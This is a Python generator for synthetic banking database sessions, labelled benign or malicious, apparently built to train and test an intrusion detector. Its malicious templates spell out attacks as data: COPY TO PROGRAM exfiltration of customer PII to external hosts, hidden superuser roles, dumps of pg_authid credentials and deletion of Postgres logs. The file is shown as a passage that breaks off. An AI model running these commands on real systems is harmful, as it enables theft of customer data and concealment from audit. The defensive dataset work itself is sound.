#!/usr/bin/env python3
"""
generate_batch_v2.py — Spec-driven synthetic scenario generator
=================================================================

Replaces the original generate_batch.py which hardcoded 5 templates and
produced 500 pairs via `i % 5` category rotation, never calling codegen.py,
never validating through validate_run.py, and never using padding_profile.

This generator:
  - Produces spec-compliant YAML in <run_dir>/specs/
  - Calls codegen.py to generate log files + expectation_manifest.json
  - Calls validate_run.py to validate the output
  - 12+ category templates with genuine structural variation
  - Includes hard negatives (benign_false_positive, malicious_false_negative)
  - Uses per-role padding from banking.yaml (built into codegen.py)
  - Structural diversity: varied step counts, timing, session counts

Usage:
    python datagen/generate_batch_v2.py \\
        --out datagen/generated/pilot_001 \\
        --runs 10 \\
        --scenarios-per-run 20 \\
        --seed 42
"""

from __future__ import annotations

import argparse
import json
import os
import random
import string
import subprocess
import sys
from collections import defaultdict
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

_REPO_ROOT = Path(__file__).resolve().parent.parent
_DATAGEN_DIR = Path(__file__).resolve().parent
if str(_DATAGEN_DIR) not in sys.path:
    sys.path.insert(0, str(_DATAGEN_DIR))

from domain_knowledge import (
    get_domain_category_generators, ALL_DOMAINS, DOMAIN_CONFIG,
    make_etl_benign as _dk_etl_benign,
    make_etl_exfil_malicious as _dk_etl_exfil_mal,
    make_frontline_routine_benign as _dk_frontline_benign,
    make_audit_benign as _dk_audit_benign,
    make_senior_eod_benign as _dk_senior_benign,
)

from generator_diversity import (
    get_diverse_external_endpoint,
    get_diverse_internal_endpoint,
    get_benign_external_endpoint,
    generate_exfil_command,
    generate_staging_command,
    generate_cleanup_command,
    generate_log_tampering_commands,
    build_semantic_family_id,
    vary_sql_query,
)


# ==========================================================================
# Domain knowledge: banking scenario building blocks
# ==========================================================================

SENSITIVE_TABLES = ["customers", "accounts"]
SENSITIVE_COLS = {
    "customers": ["national_id", "address"],
    "accounts": ["balance"],
}
NON_SENSITIVE_COLS = {
    "customers": ["customer_id", "full_name", "branch_id"],
    "accounts": ["account_id", "customer_id", "branch_id", "account_type"],
    "transactions": ["transaction_id", "account_id", "amount", "counterparty", "transaction_time"],
}
ALL_TABLES = ["customers", "accounts", "transactions"]

ROLES = ["teller", "branch_manager", "compliance_officer", "batch_etl_service"]

# INTERNAL hosts — legitimate infrastructure (benign destinations)
INTERNAL_IPS = [
    ("10.0.1.50", 5432),      # internal DB replica
    ("10.0.1.100", 8080),     # internal API
    ("10.0.2.10", 5432),      # secondary DB replica
    ("10.0.1.200", 443),      # internal HTTPS service
    ("10.0.3.15", 8443),      # internal audit service
    ("172.16.0.50", 9200),    # Elasticsearch cluster
    ("172.16.1.10", 443),     # internal vault
    ("192.168.1.100", 8080),  # branch local server
    ("198.51.100.20", 443),   # approved data warehouse
    ("198.51.100.25", 443),   # approved backup service
]

# EXTERNAL hosts — suspicious / attacker infrastructure (malicious destinations)
EXTERNAL_IPS = [
    ("93.184.216.34", 443),   # suspicious external
    ("45.33.12.9", 4444),     # reverse shell endpoint
    ("185.220.101.5", 8443),  # Tor exit node
    ("203.0.113.42", 443),    # external drop site
    ("198.51.100.77", 443),   # near-miss of approved warehouse
    ("91.219.236.174", 443),  # foreign VPS
    ("104.244.72.115", 8080), # bulletproof hosting
    ("23.129.64.100", 443),   # anonymous proxy
    ("185.100.87.41", 9443),  # darknet relay
    ("77.247.181.165", 443),  # offshore server
]

BRANCH_IDS = [
    "BR-001", "BR-002", "BR-003", "BR-014", "BR-027",
    "BR-005", "BR-008", "BR-011", "BR-019", "BR-022",
    "BR-031", "BR-035", "BR-042", "BR-050", "BR-063",
]


# ==========================================================================
# SQL fragment generators
# ==========================================================================

def _random_branch(rng):
    return rng.choice(BRANCH_IDS)

def _random_cust_id(rng):
    return rng.randint(1000, 9999)

def _random_date_range(rng):
    month = rng.randint(1, 12)
    day = rng.randint(1, 28)
    return (f"2026-{month:02d}-{day:02d} 00:00:00",
            f"2026-{month:02d}-{day+1 if day < 28 else 1:02d} 00:00:00")

def _benign_teller_queries(rng, n=None):
    """Generate 2-5 benign teller queries."""
    n = n or rng.randint(2, 5)
    pool = [
        f"SELECT balance FROM accounts WHERE customer_id = {_random_cust_id(rng)} AND branch_id = '{_random_branch(rng)}'",
        f"UPDATE accounts SET balance = balance - {rng.randint(100, 5000)} WHERE account_id = {rng.randint(10000, 99999)} AND branch_id = '{_random_branch(rng)}'",
        f"INSERT INTO transactions (account_id, amount, counterparty, transaction_time) VALUES ({rng.randint(10000, 99999)}, {rng.randint(100, 5000)}, 'Customer Transfer', NOW())",
        f"SELECT transaction_id, amount FROM transactions WHERE account_id = {rng.randint(10000, 99999)} ORDER BY transaction_time DESC LIMIT 10",
        f"SELECT full_name, customer_id FROM customers WHERE branch_id = '{_random_branch(rng)}' AND customer_id = {_random_cust_id(rng)}",
        f"SELECT account_id, account_type, balance FROM accounts WHERE customer_id = {_random_cust_id(rng)}",
        f"UPDATE accounts SET balance = balance + {rng.randint(100, 10000)} WHERE account_id = {rng.randint(10000, 99999)}",
        f"SELECT a.account_id, a.balance FROM accounts a WHERE a.customer_id = {_random_cust_id(rng)} AND a.branch_id = '{_random_branch(rng)}'",
        f"INSERT INTO transactions (account_id, amount, counterparty, transaction_time) VALUES ({rng.randint(10000, 99999)}, -{rng.randint(50, 2000)}, 'Bill Payment', NOW())",
        f"SELECT t.transaction_id, t.amount, t.counterparty FROM transactions t WHERE t.account_id = {rng.randint(10000, 99999)} AND t.transaction_time > '2026-09-01' ORDER BY t.transaction_time DESC",
        f"SELECT c.full_name, c.customer_id, a.account_type FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE c.branch_id = '{_random_branch(rng)}' AND c.customer_id = {_random_cust_id(rng)}",
        f"SELECT COUNT(*) FROM transactions WHERE account_id = {rng.randint(10000, 99999)} AND transaction_time > NOW() - INTERVAL '7 days'",
    ]
    return [rng.choice(pool) for _ in range(n)]

def _benign_manager_queries(rng, n=None):
    n = n or rng.randint(2, 4)
    branch = _random_branch(rng)
    pool = [
        f"SELECT a.account_id, a.balance, c.full_name FROM accounts a JOIN customers c ON c.customer_id = a.customer_id WHERE a.branch_id = '{branch}'",
        f"SELECT SUM(amount), COUNT(*) FROM transactions WHERE account_id IN (SELECT account_id FROM accounts WHERE branch_id = '{branch}') AND transaction_time > '2026-09-12'",
        f"SELECT COUNT(*) FROM customers WHERE branch_id = '{branch}'",
        f"SELECT a.account_type, COUNT(*), SUM(a.balance) FROM accounts a WHERE a.branch_id = '{branch}' GROUP BY a.account_type",
        f"SELECT c.full_name, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.branch_id = '{branch}' AND a.balance > {rng.randint(10000, 100000)} ORDER BY a.balance DESC",
        f"SELECT DATE(t.transaction_time), SUM(t.amount) FROM transactions t JOIN accounts a ON a.account_id = t.account_id WHERE a.branch_id = '{branch}' AND t.transaction_time > NOW() - INTERVAL '30 days' GROUP BY DATE(t.transaction_time)",
        f"SELECT c.customer_id, c.full_name, COUNT(t.transaction_id) as txn_count FROM customers c JOIN accounts a ON a.customer_id = c.customer_id JOIN transactions t ON t.account_id = a.account_id WHERE a.branch_id = '{branch}' GROUP BY c.customer_id, c.full_name ORDER BY txn_count DESC LIMIT 20",
    ]
    return [rng.choice(pool) for _ in range(n)]

def _compliance_audit_queries(rng, n=None):
    n = n or rng.randint(2, 4)
    pool = [
        "SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.balance > 100000",
        "SELECT c.customer_id, c.national_id, t.amount, t.counterparty FROM customers c JOIN accounts a ON a.customer_id = c.customer_id JOIN transactions t ON t.account_id = a.account_id WHERE t.amount > 50000",
        "SELECT c.full_name, c.national_id, COUNT(t.transaction_id) FROM customers c JOIN accounts a ON a.customer_id = c.customer_id JOIN transactions t ON t.account_id = a.account_id GROUP BY c.customer_id, c.full_name, c.national_id HAVING COUNT(t.transaction_id) > 100",
        f"SELECT c.national_id, c.address, a.balance, a.account_type FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.branch_id = '{_random_branch(rng)}' AND a.balance > {rng.randint(50000, 200000)}",
        f"SELECT c.customer_id, c.national_id, c.address, SUM(t.amount) as total FROM customers c JOIN accounts a ON a.customer_id = c.customer_id JOIN transactions t ON t.account_id = a.account_id WHERE t.counterparty LIKE '%International%' GROUP BY c.customer_id, c.national_id, c.address HAVING SUM(t.amount) > {rng.randint(100000, 500000)}",
        "SELECT DISTINCT c.national_id, c.full_name, c.address FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.account_type = 'savings' AND a.balance > 250000",
        f"SELECT c.customer_id, c.national_id, COUNT(DISTINCT a.branch_id) as branch_count FROM customers c JOIN accounts a ON a.customer_id = c.customer_id GROUP BY c.customer_id, c.national_id HAVING COUNT(DISTINCT a.branch_id) > {rng.randint(2, 4)}",
    ]
    return [rng.choice(pool) for _ in range(n)]


# ==========================================================================
# Scenario category definitions
# ==========================================================================

def _make_teller_routine_benign(rng, idx) -> dict:
    """Benign teller session — scoped queries, own branch."""
    branch = _random_branch(rng)
    queries = _benign_teller_queries(rng, rng.randint(2, 5))
    events = [{"sql": q} for q in queries]

    report_file = f"/var/lib/postgresql/reports/branch_{branch}_daily.csv"
    events.append({
        "step_id": "daily_report",
        "sql": f"COPY (SELECT account_id, balance FROM accounts WHERE branch_id = '{branch}') TO PROGRAM 'cat > {report_file}'"
    })

    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_teller_routine_{idx:04d}",
        "family_id": f"banking_teller_routine_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.randint(9, 16):02d}:{rng.choice(['00', '15', '30', '45'])}",
        "default_class": "benign",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "teller_work",
            "role": "teller",
            "class": "benign",
            "anchor": "db",
            "timing": {
                "tempo": "steady",
                "step_gaps_seconds": [rng.uniform(1.5, 4.0)]
            },
            "events": events
        }]
    }

def _make_teller_pii_dump_malicious(rng, idx) -> dict:
    """Malicious teller — reads PII across branches, dumps via COPY."""
    dest_ip, dest_port = get_diverse_external_endpoint(rng)
    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
    branch = _random_branch(rng)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_teller_pii_dump_{idx:04d}",
        "family_id": f"banking_teller_pii_dump_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.randint(10, 15):02d}:{rng.choice(['00', '15', '30', '45'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "pii_dump",
            "role": "teller",
            "class": "malicious",
            "anchor": "db",
            "timing": {
                "tempo": "bursty",
                "step_gaps_seconds": [rng.uniform(0.3, 1.5)]
            },
            "events": [
                {"sql": f"SELECT national_id, address, full_name FROM customers WHERE branch_id != '{branch}'"},
                {"step_id": "exfil",
                 "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM '{exfil_cmd}'",
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }

def _make_etl_benign(rng, idx) -> dict:
    """Benign ETL replication — scoped, incremental, to approved endpoint."""
    start, end = _random_date_range(rng)
    dest_ip, dest_port = get_diverse_internal_endpoint(rng)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_etl_repl_ben_{idx:04d}",
        "family_id": f"banking_etl_pair_fam{variant:02d}",
        "domain": "banking",
        "matched_pair_id": f"banking_etl_pair_{idx:04d}",
        "matched_dimensions": {
            "fixed": ["process_tree_shape", "role"],
            "varied": ["sql_content", "connects_to_destination"]
        },
        "time_of_day": f"{rng.choice(['01', '02', '03', '04'])}:{rng.choice(['00', '15', '30'])}",
        "default_class": "benign",
        "rule_engine_relationship": "benign_false_positive",
        "sessions": [{
            "session_label": "replication",
            "role": "batch_etl_service",
            "class": "benign",
            "anchor": "db",
            "timing": {
                "tempo": "steady",
                "step_gaps_seconds": [rng.uniform(2.0, 5.0)]
            },
            "events": [
                {"step_id": "replicate",
                 "sql": f"COPY (SELECT account_id, amount, transaction_id FROM transactions WHERE transaction_time > '{start}' AND transaction_time <= '{end}') TO PROGRAM 'curl -sX POST https://warehouse.internal.example/replicate -d @-'",
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }

def _make_etl_exfil_malicious(rng, idx) -> dict:
    """Malicious ETL — broad columns, no filter, external endpoint."""
    dest_ip, dest_port = get_diverse_external_endpoint(rng)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_etl_exfil_mal_{idx:04d}",
        "family_id": f"banking_etl_pair_fam{variant:02d}",
        "domain": "banking",
        "matched_pair_id": f"banking_etl_pair_{idx:04d}",
        "matched_dimensions": {
            "fixed": ["process_tree_shape", "role"],
            "varied": ["sql_content", "connects_to_destination"]
        },
        "time_of_day": f"{rng.choice(['01', '02', '03', '04'])}:{rng.choice(['00', '15', '30'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "replication",
            "role": "batch_etl_service",
            "class": "malicious",
            "anchor": "db",
            "timing": {
                "tempo": "steady",
                "step_gaps_seconds": [rng.uniform(2.0, 5.0)]
            },
            "events": [
                {"step_id": "replicate",
                 "sql": f"COPY (SELECT c.national_id, c.address, a.balance, a.account_id FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://sync.example.net/push -d @-'",
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }

def _make_privilege_abuse_malicious(rng, idx) -> dict:
    """Malicious — teller escalates to superuser, dumps credentials."""
    password = ''.join(rng.choices(string.ascii_letters + string.digits, k=10))
    shadow_role = rng.choice(["svc_shadow", "admin_backup", "dba_maint", "sec_ops", "audit_adm"])
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_priv_abuse_{idx:04d}",
        "family_id": f"banking_priv_abuse_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.choice(['02', '03', '04', '22', '23'])}:{rng.choice(['00', '15', '30', '45'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "escalate_and_dump",
            "role": "teller",
            "class": "malicious",
            "anchor": "db",
            "timing": {
                "tempo": "bursty",
                "step_gaps_seconds": [rng.uniform(0.5, 1.8)]
            },
            "events": [
                {"step_id": "escalate",
                 "sql": f"CREATE ROLE {shadow_role} SUPERUSER LOGIN PASSWORD '{password}'"},
                {"sql": f"SELECT national_id, address FROM customers WHERE branch_id = '{_random_branch(rng)}'"},
                {"step_id": "dump",
                 "sql": f"COPY (SELECT rolname, rolpassword FROM pg_authid) TO PROGRAM 'cat >> /var/lib/postgresql/.cache/creds_dump.txt'"},
            ]
        }]
    }

def _make_compliance_audit_benign(rng, idx) -> dict:
    """Benign compliance audit — enterprise-wide sensitive reads."""
    queries = _compliance_audit_queries(rng, rng.randint(2, 4))
    events = [{"sql": q} for q in queries]
    events.append({
        "step_id": "audit_export",
        "sql": "COPY (SELECT c.national_id, c.full_name, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.balance > 100000) TO PROGRAM 'cat > /var/lib/postgresql/audit/high_value_report.csv'"
    })
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_compliance_audit_{idx:04d}",
        "family_id": f"banking_compliance_audit_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.randint(9, 16):02d}:00",
        "default_class": "benign",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "audit",
            "role": "compliance_officer",
            "class": "benign",
            "anchor": "db",
            "timing": {
                "tempo": "steady",
                "step_gaps_seconds": [rng.uniform(3.0, 8.0)]
            },
            "events": events
        }]
    }

def _make_defense_impairment_malicious(rng, idx) -> dict:
    """Malicious — disable logging via ALTER SYSTEM SET, then truncate audit logs."""
    variant = (idx % 3) + 1
    events = generate_log_tampering_commands(rng)
    return {
        "scenario_id": f"banking_defense_impair_{idx:04d}",
        "family_id": f"banking_defense_impair_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.choice(['01', '02', '03', '23'])}:{rng.choice(['00', '15', '30', '45'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "impair_defenses",
            "role": "teller",
            "class": "malicious",
            "anchor": "db",
            "timing": {
                "tempo": "bursty",
                "step_gaps_seconds": [rng.uniform(0.3, 1.5)]
            },
            "events": events
        }]
    }

def _make_manager_eod_benign(rng, idx) -> dict:
    """Benign branch manager — end of day reconciliation."""
    branch = _random_branch(rng)
    queries = _benign_manager_queries(rng, rng.randint(2, 4))
    events = [{"sql": q} for q in queries]
    events.append({
        "step_id": "eod_report",
        "sql": f"COPY (SELECT a.account_id, a.balance FROM accounts a WHERE a.branch_id = '{branch}') TO PROGRAM 'cat > /var/lib/postgresql/reports/eod_{branch}.csv'"
    })
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_manager_eod_{idx:04d}",
        "family_id": f"banking_manager_eod_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.randint(16, 18):02d}:{rng.choice(['00', '30'])}",
        "default_class": "benign",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "eod",
            "role": "branch_manager",
            "class": "benign",
            "anchor": "db",
            "timing": {
                "tempo": "steady",
                "step_gaps_seconds": [rng.uniform(2.0, 5.0)]
            },
            "events": events
        }]
    }

def _make_compliance_exfil_malicious(rng, idx) -> dict:
    """Malicious compliance officer — exfiltrates PII to external endpoint."""
    dest_ip, dest_port = get_diverse_external_endpoint(rng)
    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_compliance_exfil_{idx:04d}",
        "family_id": f"banking_compliance_exfil_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.choice(['22', '23', '01', '02'])}:{rng.choice(['00', '15', '30'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "malicious_false_negative",
        "sessions": [{
            "session_label": "exfil",
            "role": "compliance_officer",
            "class": "malicious",
            "anchor": "db",
            "timing": {
                "tempo": "bursty",
                "step_gaps_seconds": [rng.uniform(0.3, 1.5)]
            },
            "events": [
                {"sql": "SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id"},
                {"step_id": "exfil",
                 "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM '{exfil_cmd}'",
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }

def _make_multi_session_apt(rng, idx) -> dict:
    """Multi-session APT: recon → escalation → exfil → cleanup."""
    dest_ip, dest_port = get_diverse_external_endpoint(rng)
    password = ''.join(rng.choices(string.ascii_letters + string.digits, k=10))
    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_multi_apt_{idx:04d}",
        "family_id": f"banking_multi_apt_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.choice(['01', '02', '03'])}:{rng.choice(['00', '15', '30'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [
            {
                "session_label": "recon",
                "role": "teller",
                "class": "malicious",
                "anchor": "db",
                "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 4.0)]},
                "events": [
                    {"sql": "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'"},
                    {"sql": "SELECT column_name FROM information_schema.columns WHERE table_name = 'customers'"},
                    {"step_id": "recon_probe",
                     "sql": "COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'"},
                ]
            },
            {
                "session_label": "escalate",
                "role": "teller",
                "class": "malicious",
                "anchor": "db",
                "delay_after_previous_seconds": rng.uniform(5, 30),
                "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.3, 1.0)]},
                "events": [
                    {"step_id": "create_shadow",
                     "sql": f"CREATE ROLE apt_shadow SUPERUSER LOGIN PASSWORD '{password}'"},
                    {"step_id": "dump_creds",
                     "sql": "COPY (SELECT rolname FROM pg_authid) TO PROGRAM 'cat >> /tmp/.cache/roles.txt'"},
                ]
            },
            {
                "session_label": "exfil",
                "role": "batch_etl_service",
                "class": "malicious",
                "anchor": "db",
                "delay_after_previous_seconds": rng.uniform(10, 60),
                "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 5.0)]},
                "events": [
                    {"step_id": "exfil",
                     "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM '{exfil_cmd}'",
                     "connects_to": {"ip": dest_ip, "port": dest_port}},
                ]
            },
        ]
    }

def _make_hard_neg_dba_shadow_audit(rng, idx) -> dict:
    """Hard negative: DBA legitimately reads pg_authid for password policy audit."""
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_dba_shadow_audit_{idx:04d}",
        "family_id": f"banking_dba_shadow_audit_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.randint(10, 15):02d}:00",
        "default_class": "benign",
        "rule_engine_relationship": "benign_false_positive",
        "sessions": [{
            "session_label": "shadow_audit",
            "role": "compliance_officer",
            "class": "benign",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(3.0, 6.0)]},
            "events": [
                {"sql": "SELECT rolname, rolvaliduntil FROM pg_authid WHERE rolcanlogin = true"},
                {"step_id": "export_report",
                 "sql": "COPY (SELECT rolname, rolvaliduntil FROM pg_authid WHERE rolcanlogin = true) TO PROGRAM 'cat > /var/lib/postgresql/audit/password_policy_report.csv'"},
            ]
        }]
    }

def _make_hard_neg_etl_internal(rng, idx) -> dict:
    """Hard negative: ETL COPY to internal host with sensitive columns — legitimate."""
    dest_ip, dest_port = get_diverse_internal_endpoint(rng)
    start, end = _random_date_range(rng)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_etl_internal_{idx:04d}",
        "family_id": f"banking_etl_internal_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.choice(['02', '03', '04'])}:{rng.choice(['00', '30'])}",
        "default_class": "benign",
        "rule_engine_relationship": "benign_false_positive",
        "sessions": [{
            "session_label": "etl",
            "role": "batch_etl_service",
            "class": "benign",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 4.0)]},
            "events": [
                {"step_id": "sync",
                 "sql": f"COPY (SELECT c.national_id, a.balance, a.account_id FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.branch_id = '{_random_branch(rng)}') TO PROGRAM 'curl -sX POST https://replica.internal.example/sync -d @-'",
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }

def _make_alter_role_escalation(rng, idx) -> dict:
    """Malicious — ALTER ROLE to grant superuser."""
    target_role = rng.choice(["branch_manager", "compliance_officer"])
    dest_ip, dest_port = get_diverse_external_endpoint(rng)
    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_alter_role_esc_{idx:04d}",
        "family_id": f"banking_alter_role_esc_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.choice(['01', '02', '03', '23'])}:{rng.choice(['00', '15', '30'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "escalate",
            "role": "teller",
            "class": "malicious",
            "anchor": "db",
            "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.3, 1.5)]},
            "events": [
                {"sql": f"ALTER ROLE {target_role} WITH SUPERUSER"},
                {"sql": f"SELECT national_id, address FROM customers"},
                {"step_id": "exfil",
                 "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM '{exfil_cmd}'",
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }

def _make_manager_cross_branch_benign(rng, idx) -> dict:
    """Benign — branch manager legitimately queries multiple branches for regional report."""
    branches = rng.sample(BRANCH_IDS, min(rng.randint(2, 4), len(BRANCH_IDS)))
    branch_list = "', '".join(branches)
    dest_ip, dest_port = get_diverse_internal_endpoint(rng)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_mgr_cross_branch_{idx:04d}",
        "family_id": f"banking_mgr_cross_branch_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.randint(9, 16):02d}:{rng.choice(['00', '30'])}",
        "default_class": "benign",
        "rule_engine_relationship": "benign_false_positive",
        "sessions": [{
            "session_label": "cross_branch_report",
            "role": "branch_manager",
            "class": "benign",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 6.0)]},
            "events": [
                {"sql": f"SELECT a.branch_id, COUNT(*), SUM(a.balance) FROM accounts a WHERE a.branch_id IN ('{branch_list}') GROUP BY a.branch_id"},
                {"sql": f"SELECT c.full_name, a.balance, a.branch_id FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.branch_id IN ('{branch_list}') AND a.balance > {rng.randint(50000, 200000)}"},
                {"step_id": "report_export",
                 "sql": f"COPY (SELECT a.branch_id, a.account_type, COUNT(*), SUM(a.balance) FROM accounts a WHERE a.branch_id IN ('{branch_list}') GROUP BY a.branch_id, a.account_type) TO PROGRAM 'curl -sX POST https://reports.internal.example/regional -d @-'",
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }

def _make_data_tampering_malicious(rng, idx) -> dict:
    """Malicious — direct UPDATE/DELETE on sensitive customer data to cover tracks."""
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_data_tamper_{idx:04d}",
        "family_id": f"banking_data_tamper_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.choice(['01', '02', '03', '22', '23'])}:{rng.choice(['00', '15', '30', '45'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "tamper",
            "role": "teller",
            "class": "malicious",
            "anchor": "db",
            "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.3, 1.5)]},
            "events": [
                {"sql": f"UPDATE customers SET address = '123 Fake St' WHERE customer_id = {_random_cust_id(rng)}"},
                {"sql": f"DELETE FROM transactions WHERE account_id = {rng.randint(10000, 99999)} AND amount > {rng.randint(10000, 50000)}"},
                {"step_id": "cover_tracks",
                 "sql": "COPY (SELECT 'cleanup done') TO PROGRAM 'rm -f /var/log/postgresql/postgresql.log'"},
            ]
        }]
    }

def _make_lateral_movement_malicious(rng, idx) -> dict:
    """Malicious — queries information_schema for recon, then accesses multiple tables."""
    dest_ip, dest_port = get_diverse_external_endpoint(rng)
    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_lateral_move_{idx:04d}",
        "family_id": f"banking_lateral_move_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.choice(['01', '02', '03', '23'])}:{rng.choice(['00', '15', '30'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "malicious_false_negative",
        "sessions": [
            {
                "session_label": "recon",
                "role": "teller",
                "class": "malicious",
                "anchor": "db",
                "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 5.0)]},
                "events": [
                    {"sql": "SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'public'"},
                    {"sql": f"SELECT COUNT(*) FROM customers WHERE branch_id = '{_random_branch(rng)}'"},
                    {"step_id": "probe",
                     "sql": "COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'"},
                ]
            },
            {
                "session_label": "harvest",
                "role": "teller",
                "class": "malicious",
                "anchor": "db",
                "delay_after_previous_seconds": rng.uniform(10, 60),
                "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.5, 2.0)]},
                "events": [
                    {"sql": f"SELECT national_id, address, full_name FROM customers"},
                    {"sql": f"SELECT account_id, balance, customer_id FROM accounts WHERE balance > {rng.randint(50000, 200000)}"},
                    {"step_id": "exfil",
                     "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM '{exfil_cmd}'",
                     "connects_to": {"ip": dest_ip, "port": dest_port}},
                ]
            },
        ]
    }

def _make_batch_report_benign(rng, idx) -> dict:
    """Benign — scheduled batch report generation to approved internal endpoint."""
    dest_ip, dest_port = get_diverse_internal_endpoint(rng)
    branch = _random_branch(rng)
    start, end = _random_date_range(rng)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"banking_batch_report_{idx:04d}",
        "family_id": f"banking_batch_report_fam{variant:02d}",
        "domain": "banking",
        "time_of_day": f"{rng.choice(['00', '01', '05', '06'])}:{rng.choice(['00', '30'])}",
        "default_class": "benign",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "batch_report",
            "role": "batch_etl_service",
            "class": "benign",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(3.0, 8.0)]},
            "events": [
                {"sql": f"SELECT a.branch_id, a.account_type, COUNT(*), SUM(a.balance) FROM accounts a WHERE a.branch_id = '{branch}' GROUP BY a.branch_id, a.account_type"},
                {"sql": f"SELECT COUNT(t.transaction_id), SUM(t.amount) FROM transactions t JOIN accounts a ON a.account_id = t.account_id WHERE a.branch_id = '{branch}' AND t.transaction_time > '{start}' AND t.transaction_time <= '{end}'"},
                {"step_id": "report_send",
